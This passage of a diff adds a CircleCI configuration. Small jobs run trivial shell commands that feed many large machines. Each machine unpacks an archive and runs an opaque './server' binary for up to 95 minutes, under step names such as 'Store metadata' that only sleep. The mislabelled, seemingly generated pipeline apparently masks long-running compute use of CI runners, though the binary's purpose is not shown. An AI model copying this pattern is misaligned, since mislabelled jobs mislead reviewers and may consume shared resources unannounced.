+            cat /tmp/handoff/checkpoint-C.pickle
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  canary_andromeda-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: starved
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo $(uptime | wc -w); true ; } > /tmp/handoff/92.blob
+            echo "gate andromeda-ng: $(wc -c </tmp/handoff/92.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 92.blob
+  andromeda-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/payload
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  Delta_dotnet8-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: valley
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<10;a++) for(b=a+1;b<=10;b++) for(c=b+1;c<=10;c++) if(a*a+b*b==c*c) print a","b","c}' | wc -l; true ; } > /tmp/handoff/step-2.log
+            echo "gate dotnet8-lint: $(wc -c </tmp/handoff/step-2.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-2.log
+  dotnet8-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/step-2.log
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  runner_fix-6420:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: dropped call
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "%s\n" {A..J} | awk 'BEGIN{ORS=","}END{sub(/,$/,"",RT)}1' 2>/dev/null | head -c 25 || printf "%s\n" {A..J} | tr '\n' ','; true ; } > /tmp/handoff/677.data
+            echo "gate fix-6420: $(wc -c </tmp/handoff/677.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 677.data
+  fix-6420:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/payload
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  B_phoenix-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: dude it doesnt
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && echo hi > "$tf" && stat -c %s "$tf" 2>/dev/null && rm "$tf"; true ; } > /tmp/handoff/checkpoint-E.pt
+            echo "gate phoenix-alpha: $(wc -c </tmp/handoff/checkpoint-E.pt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - checkpoint-E.pt
+  phoenix-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/checkpoint-E.pt
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  hook_q4-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: luff
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; uptime; true ; } > /tmp/handoff/main_task_output.txt
+            echo "gate q4-release: $(wc -c </tmp/handoff/main_task_output.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - main_task_output.txt
+  q4-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/main_task_output.txt
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  hook_rigel-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: flaky
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "key1=val1\nkey2=val2\nkey3=val3\n" | awk -F= '{print $1" -> "$2}'; true ; } > /tmp/handoff/846.txt
+            echo "gate rigel-final: $(wc -c </tmp/handoff/846.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 846.txt
+  rigel-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/payload
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  Gamma_PROD_MERGE_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: cov
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=200 count=1 2>/dev/null | base64 | sort | md5sum; true ; } > /tmp/handoff/full_step_output_v5.log
+            echo "gate PROD_MERGE_8: $(wc -c </tmp/handoff/full_step_output_v5.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - full_step_output_v5.log
+  PROD_MERGE_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/full_step_output_v5.log
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+
+  prep_oct8-cleanup_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: stick weld
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 12582912 /dev/urandom | md5sum; true ; } > /tmp/handoff/timings.jsonl
+            echo "gate oct8-cleanup: $(wc -c </tmp/handoff/timings.jsonl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - timings.jsonl
+  cook_artifacts_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: bench press
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo "The Quick Brown Fox" | awk '{for(i=1;i<=NF;i++)printf "%s", substr($i,1,1); print ""}'; true ; } > /tmp/handoff/log.gz
+            echo "gate artifacts: $(wc -c </tmp/handoff/log.gz) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - log.gz
+  fixture_q4-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: bang
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo "The Quick Brown Fox" | awk '{for(i=1;i<=NF;i++)printf "%s", substr($i,1,1); print ""}'; true ; } > /tmp/handoff/main_task_output.txt
+            echo "gate q4-release: $(wc -c </tmp/handoff/main_task_output.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - main_task_output.txt
+  stage_v7-preview_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: late brunch
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 82970 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/handoff/2024-04-16.data
+            echo "gate v7-preview: $(wc -c </tmp/handoff/2024-04-16.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2024-04-16.data
+  bundle_defualt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: pls dont fail
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /etc/hostname | rev; true ; } > /tmp/handoff/.done
+            echo "gate defualt: $(wc -c </tmp/handoff/.done) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .done
+  ensure_zulu_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: squat half
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo "payload" | sha256sum | awk '{print toupper($1)}' | head -c 32; true ; } > /tmp/handoff/metrics.csv
+            echo "gate zulu: $(wc -c </tmp/handoff/metrics.csv) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - metrics.csv
+  phase1_v6-alpha_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: anodize color
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; date +"%B"; true ; } > /tmp/handoff/22.data
+            echo "gate v6-alpha: $(wc -c </tmp/handoff/22.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 22.data
+  stage_PrepareService_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: below decks
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=42; while(n>0){rev = rev (n%10); n=int(n/10)}; print rev}' 2>/dev/null || awk 'BEGIN{print 42}'; true ; } > /tmp/handoff/checkpoint-C.pickle
+            echo "gate PrepareService: $(wc -c </tmp/handoff/checkpoint-C.pickle) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - checkpoint-C.pickle
+workflows:
+  default:
+    jobs:
+      - enqueue_hotfix-1682
+      - inspect_qi-ci
+      - compile_foxtrot-5
+      - hotfix-1682:
+          requires:
+            - enqueue_hotfix-1682
+            - inspect_qi-ci
+            - compile_foxtrot-5
+      - qi-ci:
+          requires:
+            - enqueue_hotfix-1682
+            - inspect_qi-ci
+            - compile_foxtrot-5
+      - foxtrot-5:
+          requires:
+            - enqueue_hotfix-1682
+            - inspect_qi-ci
+            - compile_foxtrot-5
+      - cf-2a:
+          requires:
+            - enqueue_hotfix-1682
+            - inspect_qi-ci
+            - compile_foxtrot-5
+      - andromeda-ng:
+          requires:
+            - enqueue_hotfix-1682
+            - inspect_qi-ci
+            - compile_foxtrot-5
+      - rigel-final:
+          requires:
+            - enqueue_hotfix-1682
+            - inspect_qi-ci
+            - compile_foxtrot-5
+      - phoenix-rc:
+          requires:
+            - enqueue_hotfix-1682
+            - inspect_qi-ci
+            - compile_foxtrot-5
+      - fix-6420:
+          requires:
+            - enqueue_hotfix-1682
+            - inspect_qi-ci
+            - compile_foxtrot-5
+      - redo_oct8-cleanup
+      - prep_oct8-cleanup_2:
+          requires:
+            - redo_oct8-cleanup
+      - oct8-cleanup:
+          requires:
+            - prep_oct8-cleanup_2
+      - phase_artifacts:
+          requires:
+            - prep_oct8-cleanup_2
+      - cook_artifacts_2:
+          requires:
+            - phase_artifacts
+      - artifacts:
+          requires:
+            - cook_artifacts_2
+      - hook_q4-release:
+          requires:
+            - cook_artifacts_2
+      - fixture_q4-release_2:
+          requires:
+            - hook_q4-release
+      - q4-release:
+          requires:
+            - fixture_q4-release_2
+      - fixture_v7-preview:
+          requires:
+            - fixture_q4-release_2
+      - stage_v7-preview_2:
+          requires:
+            - fixture_v7-preview
+      - v7-preview:
+          requires:
+            - stage_v7-preview_2
+      - step1_green-light
+      - green-light:
+          requires:
+            - step1_green-light
+      - p1_jan1-release:
+          requires:
+            - step1_green-light
+      - jan1-release:
+          requires:
+            - p1_jan1-release
+      - orchestrate_shippit:
+          requires:
+            - p1_jan1-release
+      - shippit:
+          requires:
+            - orchestrate_shippit
+      - Gamma_PROD_MERGE_8:
+          requires:
+            - orchestrate_shippit
+      - PROD_MERGE_8:
+          requires:
+            - Gamma_PROD_MERGE_8
+      - B_phoenix-alpha:
+          requires:
+            - Gamma_PROD_MERGE_8
+      - phoenix-alpha:
+          requires:
+            - B_phoenix-alpha
+      - compile_ci-v2:
+          requires:
+            - B_phoenix-alpha
+      - ci-v2:
+          requires:
+            - compile_ci-v2
+      - tap_go1-21-cov:
+          requires:
+            - compile_ci-v2
+      - go1-21-cov:
+          requires:
+            - tap_go1-21-cov
+      - preflight_DATA-556:
+          requires:
+            - tap_go1-21-cov
+      - DATA-556:
+          requires:
+            - preflight_DATA-556
+      - cacher_ValidateService
+      - ValidateService:
+          requires:
+            - cacher_ValidateService
+      - Delta_dotnet8-lint:
+          requires:
+            - cacher_ValidateService
+      - dotnet8-lint:
+          requires:
+            - Delta_dotnet8-lint
+      - hook_uma-push:
+          requires:
+            - Delta_dotnet8-lint
+      - uma-push:
+          requires:
+            - hook_uma-push
+      - retry_do-the-thing:
+          requires:
+            - hook_uma-push
+      - do-the-thing:
+          requires:
+            - retry_do-the-thing
+      - syncer_QA_DEPLOY_4:
+          requires:
+            - retry_do-the-thing
+      - QA_DEPLOY_4:
+          requires:
+            - syncer_QA_DEPLOY_4
+      - g2_package:
+          requires:
+            - syncer_QA_DEPLOY_4
+      - package:
+          requires:
+            - g2_package
+      - p2_defualt
+      - bundle_defualt_2:
+          requires:
+            - p2_defualt
+      - defualt:
+          requires:
+            - bundle_defualt_2
+      - A_zulu:
+          requires:
+            - bundle_defualt_2
+      - ensure_zulu_2:
+          requires:
+            - A_zulu
+      - zulu:
+          requires:
+            - ensure_zulu_2
+      - ctx_v6-alpha:
+          requires:
+            - ensure_zulu_2
+      - phase1_v6-alpha_2:
+          requires:
+            - ctx_v6-alpha
+      - v6-alpha:
+          requires:
+            - phase1_v6-alpha_2
+      - env_PrepareService:
+          requires:
+            - phase1_v6-alpha_2
+      - stage_PrepareService_2:
+          requires:
+            - env_PrepareService
+      - PrepareService:
+          requires:
+            - stage_PrepareService_2
